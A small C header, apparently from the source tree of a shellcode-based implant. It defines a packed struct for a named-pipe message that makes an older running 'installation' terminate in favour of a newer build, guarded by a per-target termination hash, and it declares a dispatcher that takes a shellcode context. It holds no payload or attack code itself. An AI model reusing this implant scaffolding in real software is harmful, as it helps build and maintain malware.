/*
	WorkDispatcher.h
*/

#include <windows.h>

#include "..\Shellcode\shellcode.h"

#pragma pack(push)
#pragma pack(1)

// termination query request, for version check at PMI_TERMINATE_HOST_PROCESS_IF_LOWER_VERSION pipe message
typedef struct _TERMINATION_QUERY
{

	UINT64 i64TerminationHash;			// special build-specific termination hash, to prevent replacement of builds for different targets
	WORD wBuildId;						// ON QUERY: build id of caller, which requests termination of an already running installation
										// ON ANSWER: build id of callee, so caller may check version and perform self-termination in case of a higher existent version

} TERMINATION_QUERY, *PTERMINATION_QUERY;

#pragma pack(pop)

VOID WorkDispatcherInit(SHELLCODE_CONTEXT *sc);